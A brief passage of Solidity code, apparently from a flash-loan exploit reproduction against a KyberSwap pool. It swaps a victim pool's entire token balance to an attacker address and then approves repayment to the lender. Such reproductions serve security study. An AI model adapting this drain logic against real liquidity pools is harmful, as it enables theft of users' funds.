            ""
        );
        IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4_295_128_740, "");

        // repay the lender
        IERC20(_token1).approve(_lender, due);

        return true;
    }

